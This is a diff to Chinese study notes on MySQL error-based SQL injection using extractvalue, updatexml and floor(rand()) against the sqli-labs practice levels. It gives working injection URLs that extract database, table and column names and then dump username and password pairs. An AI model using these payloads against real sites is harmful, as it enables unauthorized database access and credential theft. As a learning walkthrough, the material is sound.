@@ -302,7 +302,7 @@ concat的作用是拼接 **(因为无法判断回显位，所以把内容都拼�
 通过上面内容，我们大概初步了解报错注入，接下来的注入步骤类似于union注入，只不过想要的内容通过extractvalue获得
 步骤:
 1. 判断闭合方式
-2. group by判断列数
+2. group by判断列数(可省略)
 3. 拿当前数据库名
 ```sql
 ?id=-1' union select 1,2,extractvalue(1,concat(0x7e,(select database()))) --+
@@ -324,13 +324,148 @@ concat的作用是拼接 **(因为无法判断回显位，所以把内容都拼�
 ```
 ![alt text](image-284.png)
 
-我们发现extractvalue函数报错出来默认只返回32个字符串，所以可以使用substring函数显示25位往后的30个字符
+我们发现extractvalue函数报错出来默认只返回32个字符串，所以可以使用substring函数显示25位往后的30个字符。将select语句的内容用substring包起来，后面接上25，30，具体如下
 ```sql
-?id=-1' union select 1,2,extractvalue(1,concat(0x7e,(select substring（group_concat(username,password)，25，30) from users))) --+
+?id=-1' union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(username,password) from users),25,30))) --+
 ```
+![alt text](image-285.png)
 结合上面几条语句发现，就是将想要的内容放入extractvalue函数里面
 上面语句的形式还可以写成
 ```sql
 ?id=-1' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,password) from users))) --+
 ```
+
+### Updatexml()报错的报错注入
+**基础知识**
+函数updatexml(XML_document,XPath_string,new_value)包含三个参数。
+第一个参数：XML_document是string格式，为XML文档对象的名称，例如doc。
+第二个参数：XPath_string 是路径。
+第三个参数：new_value，替换查找到的符合条件的数据。
+extractvalue()是查找，updatexml是查找后更新，对于报错注入，二者起作用的都是第二关参数，其他参数无所谓
+同extactvalue(),输入的第二个参数，即更改路径的字符
+
+下面展示具体步骤(sql/less-6)
+1. 经过简单的判断为**字符型**
+2. 判断为双引号闭合
+![alt text](image-287.png)
+![alt text](image-286.png)
+3. 拿当前数据库名
+```sql
+?id=-1" and 1=updatexml(1,concat(0x7e,(select database())),3) --+
+```
+![alt text](image-288.png)
+4. 拿表名
+```sql
+?id=-1" and 1=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+
+```
+![alt text](image-289.png)
+5. 然后拿users的列名
+```sql
+?id=-1" and 1=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),3) --+
+```
+![alt text](image-290.png)
+6. 拿信息(username,password)
+```sql
+?id=-1" and 1=updatexml(1,concat(0x7e,(select group_concat(username,password) from users)),3) --+
+```
+![alt text](image-291.png)
+没有显示完全，再用substring拿剩下的
+```sql
+?id=-1" and 1=updatexml(1,concat(0x7e,substring((select group_concat(username,password) from users),25,30)),3) --+
+```
+![alt text](image-292.png)
+然后把substring里的参数已知修改（修改25为25+30），重复操作知道拿到所有
+
+### floor报错的报错注入
+**基础知识**
+**涉及到的函数** 
+**rand():** 随机返回0-1之间的小数，rand()*2结果再0-2间
+![alt text](image-293.png)
+如果改成rand(0)*2 计算不在随机而是按一定顺序排序
+
+rand() from users 有多少行计算多少次
+![alt text](image-294.png)
+floor():小数向下取整。向上取整是ceiling()
+![alt text](image-295.png)
+**concat_ws():** 将括号内的数据用一个字段连接起来，于之前的concat相识
+例如:concat_ws(1，2，3)就是将2，3拼接起来，拼接方式是1
+```sql
+select concat_ws('-',2,3);
+```
+![alt text](image-296.png)
+```sql
+select concat_ws('-',database(),floor(rand()*2)) from users;
+```
+![alt text](image-297.png)
+**group by:分组语句 as: 别名**
+用as 可以将结果重新命名
+![alt text](image-298.png)
+再加上group by进行分组
+![alt text](image-299.png)
+分组之后就要统计数量
+**count(): 汇总统计数量**
+```sql
+select count(*),concat_ws('-',database(),floor(rand()*2)) as jk from users group by jk;
+```
+![alt text](image-300.png)
+limit:用于显示指定行数
+
+**报错原理:**
+rand()函数 进行分组group by和统计count()时可能会多次执行，导致键值key重复
+```sql
+select count(*),concat_ws('-',database(),floor(rand(0)*2)) as jk from information_schema.tables group by jk;
+```
+![alt text](image-301.png)
+
+**下面用具体题目展示步骤**
+>sql/Less-5/
+
+1. 判断类型，字符型
+2. 判断闭合方式，单引号闭合
+3. 判断列数
+
+接下来的操作只要将查询信息替**换掉concat_ws的第二个参数**
+```sql
+?id=1' union select 1,count(*),concat_ws('-',2,floor(rand(0)*2)) as jk from information_schema.tables group by jk--+
+```
+4. 拿表名
+```sql
+?id=1' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as jk from information_schema.tables group by jk--+
+```
+![alt text](image-302.png)
+5. 拿列名
+```sql
+?id=1' union select 1,count(*),concat_ws('-',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),floor(rand(0)*2)) as jk from information_schema.tables group by jk--+
+```
+6. 拿信息
+```sql
+?id=-1' union select 1,count(*),concat_ws('-',(select group_concat(username,password) from users),floor(rand(0)*2)) as jk from information_schema.tables group by jk--+
+```
+这里由于信息太长group_concat不能直接拿出来，可以用concat配合limit来限制输出
+```sql
+?id=1' union select 1,count(*),concat_ws('-',(select concat(username,password) from users limit 0,1),floor(rand(0)*2)) as jk from information_schema.tables group by jk--+
+```
+通过不断修改limit后面的第一个参数显示出不通的内容
+![alt text](image-303.png)
+还可以通过substring来解决
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
